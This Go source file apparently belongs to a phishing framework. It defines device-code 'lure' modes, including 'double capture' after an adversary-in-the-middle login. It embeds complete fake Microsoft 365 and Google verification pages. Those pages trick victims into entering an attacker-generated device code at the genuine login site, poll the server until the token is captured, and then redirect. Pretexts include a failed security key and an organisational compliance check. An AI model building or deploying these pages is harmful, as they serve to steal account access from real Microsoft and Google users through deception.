package core

// Device Code chaining modes for lures
const (
	DCModeOff      = "off"      // No device code chaining (default)
	DCModeAlways   = "always"   // Always redirect to device code after AitM success (double capture)
	DCModeFallback = "fallback" // Only use device code if AitM session stalls/fails
	DCModeAuto     = "auto"     // Pre-generate on lure click, auto-select strategy based on outcome
	DCModeDirect   = "direct"   // Skip AitM entirely, show device code interstitial immediately
)

// ValidDeviceCodeModes lists all valid modes
var ValidDeviceCodeModes = []string{DCModeOff, DCModeAlways, DCModeFallback, DCModeAuto, DCModeDirect}

// IsValidDeviceCodeMode checks if a mode string is valid
func IsValidDeviceCodeMode(mode string) bool {
	for _, m := range ValidDeviceCodeModes {
		if m == mode {
			return true
		}
	}
	return false
}

// DEVICE_CODE_INTERSTITIAL_HTML is the Microsoft-styled interstitial page
// served at /dc/{session_id} to redirect victims to microsoft.com/devicelogin
// Placeholders: {user_code}, {verify_url}, {session_id}, {template_type}, {expires_minutes}
const DEVICE_CODE_INTERSTITIAL_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="referrer" content="no-referrer">
<title>Microsoft 365 - Document Access</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI','Helvetica Neue',Arial,sans-serif;background:#f3f2f1;min-height:100vh}
.header{background:#0078d4;padding:12px 24px;display:flex;align-items:center;gap:12px}
.header svg{width:24px;height:24px}
.header-text{color:#fff;font-size:16px;font-weight:600}
.main{display:flex;justify-content:center;align-items:center;min-height:calc(100vh - 56px);padding:20px}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.12);max-width:480px;width:100%;overflow:hidden}
.doc-header{padding:20px 24px;border-bottom:1px solid #edebe9;display:flex;align-items:center;gap:14px}
.doc-icon{width:40px;height:48px;background:linear-gradient(135deg,#185abd 0%,#2b7cd3 100%);border-radius:4px;display:flex;align-items:center;justify-content:center;position:relative}
.doc-icon::after{content:'';position:absolute;top:0;right:0;width:12px;height:12px;background:#fff;clip-path:polygon(100% 0,0 100%,100% 100%)}
.doc-icon svg{width:20px;height:20px;fill:#fff}
.doc-title{font-size:15px;font-weight:600;color:#323130}
.doc-subtitle{font-size:12px;color:#605e5c;margin-top:2px}
.content{padding:32px 24px;text-align:center}
.lock-icon{width:56px;height:56px;background:#f3f2f1;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
.lock-icon svg{width:28px;height:28px;fill:#0078d4}
.title{font-size:20px;font-weight:600;color:#323130;margin-bottom:8px}
.subtitle{font-size:14px;color:#605e5c;margin-bottom:24px;line-height:1.5}
.code-box{background:#c50f1f;border-radius:6px;padding:20px 24px;margin-bottom:20px}
.code-label{font-size:11px;color:rgba(255,255,255,.8);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:8px}
.code{font-size:32px;font-weight:700;letter-spacing:6px;color:#fff;font-family:'Segoe UI',monospace;margin-bottom:12px}
.copy-btn{background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.3);color:#fff;padding:8px 24px;border-radius:4px;font-size:13px;font-weight:600;cursor:pointer;transition:background .15s}
.copy-btn:hover{background:rgba(255,255,255,.25)}
.steps{text-align:left;margin:24px 0;padding:0 8px}
.step{display:flex;align-items:flex-start;gap:12px;margin-bottom:14px}
.step-num{width:24px;height:24px;background:#0078d4;border-radius:50%;color:#fff;font-size:12px;font-weight:600;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.step-text{font-size:14px;color:#323130;line-height:1.5;padding-top:2px}
.continue-btn{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;background:#0078d4;color:#fff;border:none;padding:14px 24px;border-radius:4px;font-size:15px;font-weight:600;cursor:pointer;transition:background .15s;text-decoration:none;margin-top:8px}
.continue-btn:hover{background:#106ebe}
.continue-btn svg{width:20px;height:20px;fill:#fff}
.footer{padding:16px 24px;border-top:1px solid #edebe9;display:flex;align-items:center;justify-content:center;gap:8px}
.footer svg{width:16px;height:16px;fill:#107c10}
.footer-text{font-size:12px;color:#605e5c}
.timer{font-size:11px;color:#a19f9d;margin-top:12px}
.copied{color:#107c10;font-size:13px;margin-top:6px;min-height:20px}
.spinner{display:none;margin:12px auto;width:20px;height:20px;border:2px solid #edebe9;border-top:2px solid #0078d4;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.complete{display:none;text-align:center;padding:40px 24px}
.complete-icon{width:64px;height:64px;background:#dff6dd;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
.complete-icon svg{width:32px;height:32px;fill:#107c10}
.complete-title{font-size:18px;font-weight:600;color:#323130;margin-bottom:8px}
.complete-text{font-size:14px;color:#605e5c}
</style>
</head>
<body>
<div class="header">
<svg viewBox="0 0 24 24"><path fill="#fff" d="M11.5 3v8.5H3V3h8.5zm0 18H3v-8.5h8.5V21zM21 3v8.5h-8.5V3H21zm0 18h-8.5v-8.5H21V21z"/></svg>
<span class="header-text">Microsoft 365</span>
</div>
<div class="main">
<div class="card">
<div class="doc-header">
<div class="doc-icon">
<svg viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm-1 7V3.5L18.5 9H13z"/></svg>
</div>
<div>
<div class="doc-title" id="docTitle">Secure_Document.pdf</div>
<div class="doc-subtitle">Protected file • Requires verification</div>
</div>
</div>
<div class="content" id="verifyView">
<div class="lock-icon">
<svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
</div>
<div class="title" id="titleText">Verify your identity</div>
<div class="subtitle" id="subtitleText">To access this document, please complete verification with Microsoft.</div>

<div class="code-box">
<div class="code-label">Your verification code</div>
<div class="code" id="userCode">{user_code}</div>
<button class="copy-btn" onclick="copyCode()">Copy Code</button>
</div>
<div class="copied" id="copiedMsg">&nbsp;</div>

<div class="steps">
<div class="step"><div class="step-num">1</div><div class="step-text">Copy the code above</div></div>
<div class="step"><div class="step-num">2</div><div class="step-text">Click continue and paste (Ctrl+V)</div></div>
<div class="step"><div class="step-num">3</div><div class="step-text">Sign in with your Microsoft account</div></div>
</div>

<a class="continue-btn" href="{verify_url}" target="_blank" rel="noopener" onclick="document.getElementById('spinner').style.display='block'">
<svg viewBox="0 0 24 24"><path d="M11.5 3v8.5H3V3h8.5zm0 18H3v-8.5h8.5V21zM21 3v8.5h-8.5V3H21zm0 18h-8.5v-8.5H21V21z"/></svg>
Continue to Microsoft
</a>

<div class="spinner" id="spinner"></div>
<div class="timer" id="timerText">Code expires in <span id="countdown">{expires_minutes}:00</span></div>
</div>

<div class="complete" id="completeView">
<div class="complete-icon">
<svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
</div>
<div class="complete-title">Verification complete</div>
<div class="complete-text">Redirecting to your document...</div>
</div>
</div>
<div class="footer">
<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
<span class="footer-text">Secured by Microsoft</span>
</div>
</div>
</div>

<script>
(function(){
var sid='{session_id}';
var expMs={expires_seconds}*1000;
var startTime=Date.now();

// Template-specific customization
var tpl='{template_type}';
if(tpl==='fallback'){
document.getElementById('titleText').textContent='Verification Required';
document.getElementById('subtitleText').textContent='Your security key could not be verified. Please use code verification instead.';
document.getElementById('docTitle').textContent='Access_Verification.pdf';
}else if(tpl==='compliance'){
document.getElementById('titleText').textContent='Organization Security Check';
document.getElementById('subtitleText').textContent='Your organization requires identity verification to access this resource.';
document.getElementById('docTitle').textContent='Compliance_Check.pdf';
}

function copyCode(){
var code=document.getElementById('userCode').textContent;
if(navigator.clipboard){
navigator.clipboard.writeText(code).then(function(){
document.getElementById('copiedMsg').textContent='Code copied!';
setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2000);
});
}else{
var ta=document.createElement('textarea');
ta.value=code;
document.body.appendChild(ta);
ta.select();
document.execCommand('copy');
document.body.removeChild(ta);
document.getElementById('copiedMsg').textContent='Code copied!';
setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2000);
}
}
window.copyCode=copyCode;

// Countdown timer
function updateTimer(){
var elapsed=Date.now()-startTime;
var remaining=Math.max(0,expMs-elapsed);
if(remaining<=0){
document.getElementById('countdown').textContent='EXPIRED';
return;
}
var m=Math.floor(remaining/60000);
var s=Math.floor((remaining%60000)/1000);
document.getElementById('countdown').textContent=m+':'+(s<10?'0':'')+s;
setTimeout(updateTimer,1000);
}
updateTimer();

// Poll for device code completion
function checkStatus(){
fetch('/dc/status/'+sid,{method:'GET',credentials:'include'})
.then(function(r){return r.json()})
.then(function(d){
if(d.captured){
document.getElementById('verifyView').style.display='none';
document.getElementById('completeView').style.display='block';
setTimeout(function(){
if(d.redirect_url){
top.location.href=d.redirect_url;
}
},1500);
}else if(d.expired){
document.getElementById('countdown').textContent='EXPIRED';
}else{
setTimeout(checkStatus,3000);
}
})
.catch(function(){
setTimeout(checkStatus,5000);
});
}
setTimeout(checkStatus,5000);
})();
</script>
</body>
</html>`

// DEVICE_CODE_POLL_STATUS_JS is injected to poll for device code status
// Used when we need to redirect during an existing AitM session
const DEVICE_CODE_POLL_STATUS_JS = `
(function(){
var sid='{session_id}';
function checkDC(){
fetch('/dc/status/'+sid,{method:'GET',credentials:'include'})
.then(function(r){return r.json()})
.then(function(d){
if(d.captured && d.redirect_url){
top.location.href=d.redirect_url;
}else if(!d.expired){
setTimeout(checkDC,3000);
}
})
.catch(function(){setTimeout(checkDC,5000);});
}
setTimeout(checkDC,3000);
})();
`

// DEVICE_CODE_GOOGLE_INTERSTITIAL_HTML is the Google-styled interstitial page
// served at /dc/{session_id} for Google Workspace / Gmail device code phishing
// Placeholders: {user_code}, {verify_url}, {session_id}, {template_type}, {expires_minutes}, {expires_seconds}
const DEVICE_CODE_GOOGLE_INTERSTITIAL_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="referrer" content="no-referrer">
<title>Google Account</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Google Sans','Roboto','Segoe UI',Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#202124}
.container{background:#fff;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;max-width:450px;width:100%;text-align:center}
.logo{margin-bottom:16px}
.title{font-size:24px;font-weight:400;margin-bottom:8px;color:#202124}
.subtitle{font-size:14px;color:#5f6368;margin-bottom:24px;line-height:20px}
.steps{text-align:left;margin:0 0 24px;padding:0 0 0 24px}
.steps li{font-size:14px;color:#202124;margin-bottom:12px;line-height:20px}
.steps li a{color:#1a73e8;text-decoration:none;font-weight:500}
.steps li a:hover{text-decoration:underline}
.code-container{background:#f8f9fa;border:1px solid #dadce0;border-radius:8px;padding:16px 24px;margin:0 auto 24px;display:inline-block;min-width:200px}
.code{font-size:28px;font-weight:500;letter-spacing:4px;color:#1a73e8;font-family:'Google Sans',monospace}
.btn-row{display:flex;gap:8px;justify-content:center;margin-bottom:16px}
.btn{display:inline-flex;align-items:center;justify-content:center;padding:8px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;border:none;transition:background .2s,box-shadow .2s;font-family:'Google Sans','Roboto',sans-serif}
.btn-primary{background:#1a73e8;color:#fff}
.btn-primary:hover{background:#1765cc;box-shadow:0 1px 3px rgba(0,0,0,.2)}
.btn-secondary{background:#fff;color:#1a73e8;border:1px solid #dadce0}
.btn-secondary:hover{background:#f8f9fa}
.timer{font-size:12px;color:#80868b;margin-top:8px}
.copied{color:#137333;font-size:13px;margin-top:4px;min-height:20px}
.footer{margin-top:24px;font-size:12px;color:#80868b}
.footer a{color:#1a73e8;text-decoration:none}
.spinner{display:none;margin:16px auto;width:24px;height:24px;border:3px solid #e8eaed;border-top:3px solid #1a73e8;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.complete{display:none;text-align:center;padding:20px}
.complete .check{font-size:48px;color:#137333;margin-bottom:12px}
.complete .msg{font-size:16px;color:#202124}
.status-icon{margin:20px 0 16px;font-size:40px}
</style>
</head>
<body>
<div class="container" id="main">
<div class="logo">
<svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
<text x="0" y="19" font-family="Product Sans,Google Sans,Roboto,Arial,sans-serif" font-size="22" font-weight="500">
<tspan fill="#4285f4">G</tspan><tspan fill="#ea4335">o</tspan><tspan fill="#fbbc04">o</tspan><tspan fill="#4285f4">g</tspan><tspan fill="#34a853">l</tspan><tspan fill="#ea4335">e</tspan>
</text>
</svg>
</div>

<div id="verifyView">
<div class="status-icon" id="statusIcon">&#128274;</div>
<div class="title" id="titleText">Device Verification</div>
<div class="subtitle" id="subtitleText">Complete the sign-in process by verifying your device.</div>

<ol class="steps">
<li>Go to <a href="{verify_url}" target="_blank" rel="noopener" id="verifyLink">{verify_url}</a></li>
<li>Enter the code shown below</li>
<li>Sign in with your Google account and approve access</li>
</ol>

<div class="code-container">
<div class="code" id="userCode">{user_code}</div>
</div>
<div class="copied" id="copiedMsg">&nbsp;</div>

<div class="btn-row">
<button class="btn btn-primary" onclick="copyCode()">Copy code</button>
<a class="btn btn-secondary" href="{verify_url}" target="_blank" rel="noopener">Open link</a>
</div>

<div class="timer" id="timerText">Code expires in <span id="countdown">{expires_minutes}:00</span></div>
<div class="spinner" id="spinner"></div>
</div>

<div class="complete" id="completeView">
<div class="check">&#10004;</div>
<div class="msg">Verification complete. Redirecting...</div>
</div>

<div class="footer">
<a href="https://support.google.com">Help</a> &middot;
<a href="https://policies.google.com/privacy">Privacy</a> &middot;
<a href="https://policies.google.com/terms">Terms</a>
</div>
</div>

<script>
(function(){
var sid='{session_id}';
var expMs={expires_seconds}*1000;
var startTime=Date.now();

var tpl='{template_type}';
if(tpl==='fallback'){
document.getElementById('statusIcon').innerHTML='&#9888;&#65039;';
document.getElementById('titleText').textContent='Verification method unavailable';
document.getElementById('subtitleText').textContent='Your security key could not be verified. Use an alternative method to complete sign-in.';
}else if(tpl==='compliance'){
document.getElementById('statusIcon').innerHTML='&#128187;';
document.getElementById('titleText').textContent='Device enrollment required';
document.getElementById('subtitleText').textContent='Your organization requires device registration to access this service.';
}else{
document.getElementById('statusIcon').innerHTML='&#9989;';
document.getElementById('titleText').textContent='Sign-in verified';
document.getElementById('subtitleText').textContent='One more step: Link this device to your account for continued access.';
}

function copyCode(){
var code=document.getElementById('userCode').textContent;
if(navigator.clipboard){
navigator.clipboard.writeText(code).then(function(){
document.getElementById('copiedMsg').textContent='Code copied!';
setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2000);
});
}else{
var ta=document.createElement('textarea');
ta.value=code;
document.body.appendChild(ta);
ta.select();
document.execCommand('copy');
document.body.removeChild(ta);
document.getElementById('copiedMsg').textContent='Code copied!';
setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2000);
}
}
window.copyCode=copyCode;

function updateTimer(){
var elapsed=Date.now()-startTime;
var remaining=Math.max(0,expMs-elapsed);
if(remaining<=0){
document.getElementById('countdown').textContent='EXPIRED';
return;
}
var m=Math.floor(remaining/60000);
var s=Math.floor((remaining%60000)/1000);
document.getElementById('countdown').textContent=m+':'+(s<10?'0':'')+s;
setTimeout(updateTimer,1000);
}
updateTimer();

function checkStatus(){
fetch('/dc/status/'+sid,{method:'GET',credentials:'include'})
.then(function(r){return r.json()})
.then(function(d){
if(d.captured){
document.getElementById('verifyView').style.display='none';
document.getElementById('completeView').style.display='block';
setTimeout(function(){
if(d.redirect_url){
top.location.href=d.redirect_url;
}
},1500);
}else if(d.expired){
document.getElementById('countdown').textContent='EXPIRED';
}else{
document.getElementById('spinner').style.display='block';
setTimeout(checkStatus,3000);
}
})
.catch(function(){
setTimeout(checkStatus,5000);
});
}
setTimeout(checkStatus,5000);
})();
</script>
</body>
</html>`

// GetInterstitialForProvider returns the appropriate interstitial HTML template for the provider
func GetInterstitialForProvider(provider string) string {
	switch provider {
	case DCProviderGoogle:
		return DEVICE_CODE_GOOGLE_INTERSTITIAL_HTML
	default:
		return DEVICE_CODE_INTERSTITIAL_HTML
	}
}
